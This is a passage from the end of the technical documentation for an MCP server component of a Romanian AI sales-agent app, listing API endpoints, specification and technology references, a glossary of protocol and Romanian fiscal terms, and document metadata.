    auth: required
    body:
      name: string (required)
      arguments: object (required)
    response: { result, cached, duration }

# ───────────────────────────────────────────────────────────────────
# Resource Endpoints
# ───────────────────────────────────────────────────────────────────
resources:
  list:
    method: GET
    path: /resources
    auth: required
    response: { resources: [] }
  
  get:
    method: GET
    path: /resources/{uri}
    auth: required
    response: { content, mimeType, metadata }

# ───────────────────────────────────────────────────────────────────
# Health Endpoints
# ───────────────────────────────────────────────────────────────────
health:
  liveness:
    method: GET
    path: /health/liveness
    auth: none
    response: { status: 'ok' }
  
  readiness:
    method: GET
    path: /health/readiness
    auth: none
    response: { status, components }
  
  full:
    method: GET
    path: /health
    auth: optional
    response: { full health report }

# ───────────────────────────────────────────────────────────────────
# Metrics Endpoint
# ───────────────────────────────────────────────────────────────────
metrics:
  prometheus:
    method: GET
    path: /metrics
    port: 9090
    auth: none
    response: Prometheus format metrics
```

### 12.4 External References

#### 12.4.1 MCP Protocol Specification

```
Model Context Protocol (MCP) - Official Specification
=====================================================

Specification URL: https://spec.modelcontextprotocol.io/specification/2024-11-05/

Key Documents:
- Core Protocol: /specification/2024-11-05/basic/
- Lifecycle: /specification/2024-11-05/basic/lifecycle/
- Transports: /specification/2024-11-05/basic/transports/
- Resources: /specification/2024-11-05/server/resources/
- Tools: /specification/2024-11-05/server/tools/
- Prompts: /specification/2024-11-05/server/prompts/
- Sampling: /specification/2024-11-05/client/sampling/
- Roots: /specification/2024-11-05/client/roots/

JSON-RPC 2.0 Reference:
- Specification: https://www.jsonrpc.org/specification
```

#### 12.4.2 Technology References

```yaml
# Primary Technologies
nodejs:
  version: "24.12.0 LTS"
  docs: https://nodejs.org/docs/latest-v24.x/api/
  
typescript:
  version: "5.7.x"
  docs: https://www.typescriptlang.org/docs/

fastify:
  version: "5.6.2"
  docs: https://fastify.dev/docs/latest/

# Database
postgresql:
  version: "18.1"
  docs: https://www.postgresql.org/docs/18/

drizzle:
  version: "0.39.x"
  docs: https://orm.drizzle.team/docs/overview

# Caching & Queues
redis:
  version: "7.4.7"
  docs: https://redis.io/docs/

bullmq:
  version: "5.x"
  docs: https://docs.bullmq.io/

# AI/LLM
anthropic_sdk:
  version: "0.52.x"
  docs: https://docs.anthropic.com/claude/reference/

# Observability
opentelemetry:
  version: "1.x"
  docs: https://opentelemetry.io/docs/

pino:
  version: "9.x"
  docs: https://github.com/pinojs/pino

prometheus:
  docs: https://prometheus.io/docs/

# Security
jose:
  docs: https://github.com/panva/jose
  
helmet:
  docs: https://helmetjs.github.io/

# Testing
vitest:
  version: "2.x"
  docs: https://vitest.dev/

testcontainers:
  docs: https://node.testcontainers.org/

# Romanian Services
anaf_api:
  docs: https://static.anaf.ro/static/10/Anaf/Informatii_R/Servicii_web/doc_WS_V8.txt

oblio_api:
  docs: https://www.oblio.eu/docs/api/

termene_api:
  docs: https://termene.ro/api
```

### 12.5 Glossary

```markdown
# MCP Server Glossary

## Protocol Terms

**MCP (Model Context Protocol)**
: A standardized protocol for communication between AI models and external systems, enabling tools, resources, and prompts to be shared across different AI implementations.

**JSON-RPC 2.0**
: A lightweight remote procedure call protocol using JSON for data encoding, forming the transport layer of MCP.

**Resource**
: Data sources that MCP servers expose to clients, identified by URIs and returning structured content.

**Tool**
: Functions that MCP servers expose to AI models, allowing them to perform actions like database queries or API calls.

**Prompt**
: Reusable prompt templates that can be shared between AI applications.

**Sampling**
: The process of requesting completions from AI models through the MCP protocol.

## Architecture Terms

**L1 Worker (Resource Loader)**
: Component responsible for loading, caching, and managing MCP resources.

**L2 Worker (Tool Registry)**
: Component that registers, validates, and executes MCP tools.

**L3 Worker (Session Manager)**
: Component handling session lifecycle, context management, and state persistence.

**Tenant**
: An isolated customer environment within the multi-tenant architecture.

**HITL (Human-in-the-Loop)**
: Process requiring human approval for certain AI actions, particularly those with business impact.

## Romanian Business Terms

**CUI (Cod Unic de Înregistrare)**
: Unique Registration Code - the primary business identifier in Romania.

**ANAF (Agenția Națională de Administrare Fiscală)**
: National Agency for Fiscal Administration - Romanian tax authority.

**e-Factura**
: Mandatory electronic invoicing system in Romania.

**SPV (Spațiul Privat Virtual)**
: Virtual Private Space - ANAF's secure portal for fiscal data exchange.

**TVA**
: Value Added Tax (Romanian: Taxa pe Valoarea Adăugată).

## Technical Terms

**BullMQ**
: Job queue library for Node.js built on Redis, used for background task processing.

**Drizzle ORM**
: TypeScript ORM providing type-safe database access and migrations.

**OpenTelemetry**
: Observability framework for distributed tracing and metrics collection.

**Pino**
: High-performance JSON logger for Node.js.

**RBAC (Role-Based Access Control)**
: Authorization model where permissions are assigned to roles rather than individual users.

**JWT (JSON Web Token)**
: Compact, URL-safe token format for representing claims between parties.
```

---

## Document Metadata

```yaml
document:
  title: "Workers L (MCP Server) - Complete Technical Documentation"
  version: "1.0.0"
  status: "Final"
  created: "2026-01-18"
  updated: "2026-01-18"
  author: "Cerniq Development Team"
  
project:
  name: "Cerniq.app"
  stage: "Etapa 3 - AI Sales Agent"
  component: "Workers L - MCP Server"
  
compliance:
  gdpr: true
  efactura: true
  anaf_integration: true
  
technology_stack:
  runtime: "Node.js 24.12.0 LTS"
  language: "TypeScript 5.7.x"
  framework: "Fastify 5.6.2"
  database: "PostgreSQL 18.1"
  cache: "Redis 8.4.0"
  queue: "BullMQ 5.66.5"
  ai: "Anthropic Claude claude-sonnet-4-20250514"
  
estimated_lines: 24000
sections: 12
subsections: 45+
```

---

**END OF DOCUMENT - Workers L (MCP Server) Complete**
